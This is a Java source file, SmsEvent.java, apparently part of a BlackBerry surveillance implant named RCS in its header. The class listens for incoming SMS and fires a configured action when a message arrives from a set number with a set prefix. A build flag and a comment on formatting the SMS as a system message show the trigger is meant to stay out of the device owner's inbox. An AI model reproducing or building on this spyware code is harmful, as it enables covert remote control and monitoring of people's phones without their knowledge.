//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;

import net.rim.device.api.util.DataBuffer;
import blackberry.agent.sms.SmsListener;
import blackberry.agent.sms.SmsListener45;
import blackberry.agent.sms.SmsListener46;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;
import blackberry.utils.WChar;

/**
 * To prevent this message from appearing in the BlackBerry device user’s inbox,
 * the sending server should configure the SMS message so that the message type
 * is a system message. This message type can be defined by setting the Protocol
 * Identifier (TP-PID) to 64 (0x40), and the Digital Coding Scheme (TP-DCS) to
 * 244 (0xF4), as shown below: 07913180998000F0040491369740F43080224100238
 * A1168656C6C6F62696E61727974706964363
 * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
 * 348583
 * /796557/800451/800563/How_To_-_Use_SMS_to_notify_an_application.html?nodeid
 * =1266974&vernum=0
 * 
 * @author user1
 */
public final class SmsEvent extends Event implements 
        SmsObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
    //#endif

    String number;
    String text;

    SmsListener smsListener;

    // private final boolean stop = false;
    private DatagramConnection dc;
    MessageConnection mc;

    /**
     * Instantiates a new sms event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public SmsEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
        setPeriod(NEVER);

        //#ifdef SMS_HIDE
        smsListener = SmsListener46.getInstance();
        //#else
        smsListener = SmsListener45.getInstance();
        //#endif
    }

    protected void actualStart() {
        smsListener.addSmsObserver(this);
    }

    protected void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        smsListener.removeSmsObserver(this);
    }

  
    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            int numLen = databuffer.readInt();
            byte[] numberW = new byte[numLen];
            databuffer.read(numberW);

            number = WChar.getString(numberW, true);

            int textLen = databuffer.readInt();
            byte[] textW = new byte[textLen];
            databuffer.read(textW);

            if (textLen > 0) {
                //#ifdef DEBUG
                debug.trace("parse: we have a text");
                //#endif
                text = WChar.getString(textW, true).toLowerCase();
            }

            //#ifdef DEBUG
            debug.trace("parse number: " + number);
            debug.trace("parse text: " + text);
            //#endif

        } catch (final EOFException e) {

            return false;
        }
        return true;
    }

    public boolean onNewSms(byte[] dataMsg, String address, boolean incoming) {

        String msg = null;

        msg = (new String(dataMsg)).toLowerCase();

        if (incoming && address.endsWith(number)) {
            //#ifdef DEBUG
            debug.trace("notifyIncomingMessage: good number " + address);
            //#endif

            // case insensitive
            if (text == null || msg.startsWith(text)) {
                //#ifdef DEBUG
                debug.trace("notifyIncomingMessage good message: " + msg);
                //#endif

                trigger();
                return true;
            }
        }
        
        return false;

    }

}
